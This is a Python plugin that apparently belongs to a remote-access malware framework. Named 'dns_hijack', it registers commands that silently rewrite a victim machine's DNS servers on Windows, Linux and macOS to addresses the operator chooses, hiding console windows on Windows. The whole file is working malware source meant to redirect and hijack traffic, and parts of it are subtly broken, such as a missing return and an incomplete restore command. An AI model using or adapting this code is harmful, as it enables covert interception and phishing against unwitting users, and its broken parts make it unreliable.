PLUGIN = {"name": "dns_hijack", "desc": "Modify DNS settings to hijack traffic", "deps": [], "size": 2.0}

STUB_CODE = r"""
import subprocess, os, platform

def _get_dns_windows():
    try:
        out = subprocess.check_output(["netsh", "interface", "ip", "show", "dns"], timeout=15, creationflags=0x08000000, stderr=subprocess.DEVNULL).decode(errors="replace")
        lines = [l.strip() for l in out.split("\n") if "DNS" in l and ":" in l]
        return lines if lines else ["No DNS servers found"]
    except: return ["netsh failed"]

def _set_dns_windows(primary="8.8.8.8", secondary="8.8.4.4"):
    try:
        out = subprocess.check_output(["netsh", "interface", "show", "interface"], timeout=10, creationflags=0x08000000, stderr=subprocess.DEVNULL).decode()
        interfaces = []
        for line in out.split("\n"):
            parts = line.strip().split()
            if len(parts) >= 4 and "Connected" in line:
                name = " ".join(parts[3:])
                interfaces.append(name)
        results = []
        for iface in interfaces:
            try:
                r1 = subprocess.run(["netsh", "interface", "ip", "set", "dns", f'name={iface}', "static", primary], capture_output=True, timeout=10, creationflags=0x08000000)
                results.append(f"Set DNS on {iface}: {r1.returncode}")
                if secondary:
                    r2 = subprocess.run(["netsh", "interface", "ip", "add", "dns", f'name={iface}', secondary, "index=2"], capture_output=True, timeout=10, creationflags=0x08000000)
            except Exception as e:
                results.append(f"Failed {iface}: {e}")
        return results
    except Exception as e: return [str(e)]

def _set_dns_linux(primary="8.8.8.8", secondary="8.8.4.4"):
    try:
        with open("/etc/resolv.conf", "w") as f:
            f.write(f"nameserver {primary}\nnameserver {secondary}\n")
        return ["DNS servers updated in /etc/resolv.conf"]
    except Exception as e: return [str(e)]

def _set_dns_macos(primary="8.8.8.8", secondary="8.8.4.4"):
    try:
        services = subprocess.check_output(["networksetup", "-listallnetworkservices"], timeout=10).decode().split("\n")
        results = []
        for svc in services:
            svc = svc.strip()
            if svc and not svc.startswith("*") and svc != "An asterisk":
                try:
                    subprocess.run(["networksetup", "-setdnsservers", svc, primary, secondary], capture_output=True, timeout=10)
                    results.append(f"Set DNS on {svc}")
                except: pass
        return results
    except Exception as e: [str(e)]

def _cmd_dns_get(m):
    try:
        if platform.system() == "Windows":
            dns_info = _get_dns_windows()
        elif platform.system() == "Linux":
            try:
                with open("/etc/resolv.conf") as f: dns_info = [l.strip() for l in f if l.startswith("nameserver")]
            except: dns_info = ["Cannot read /etc/resolv.conf"]
        elif platform.system() == "Darwin":
            dns_info = ["Run: networksetup -getdnsservers <service>"]
        else: dns_info = ["Unsupported OS"]
        return {"output": "\n".join(["[+] Current DNS:"] + ["  " + l for l in dns_info])}
    except Exception as e: return {"output": f"[!] DNS get error: {e}"}

def _cmd_dns_set(m):
    try:
        primary = m.get("primary", "8.8.8.8")
        secondary = m.get("secondary", "8.8.4.4")
        if platform.system() == "Windows":
            r = _set_dns_windows(primary, secondary)
        elif platform.system() == "Linux":
            r = _set_dns_linux(primary, secondary)
        elif platform.system() == "Darwin":
            r = _set_dns_macos(primary, secondary)
        else:
            r = ["Unsupported OS"]
        output = "[+] DNS Update Results:\n" + "\n".join("  " + l for l in r)
        return {"output": output}
    except Exception as e: return {"output": f"[!] DNS set error: {e}"}

def _cmd_dns_restore(m):
    try:
        if platform.system() == "Windows":
            out = subprocess.check_output(["netsh", "interface", "ip", "set", "dns"], timeout=15, creationflags=0x08000000, stderr=subprocess.DEVNULL).decode(errors="replace")
            return {"output": "[+] DNS settings reset to DHCP"}
        elif platform.system() == "Linux":
            return {"output": "[!] Manual restore of /etc/resolv.conf required"}
        return {"output": "[!] Unsupported OS"}
    except Exception as e: return {"output": f"[!] DNS restore error: {e}"}

_CMDS["dns_get"] = _cmd_dns_get
_CMDS["dns_set"] = _cmd_dns_set
_CMDS["dns_restore"] = _cmd_dns_restore
"""

def get_commands():
    return {"dns_get": "_cmd_dns_get", "dns_set": "_cmd_dns_set", "dns_restore": "_cmd_dns_restore"}
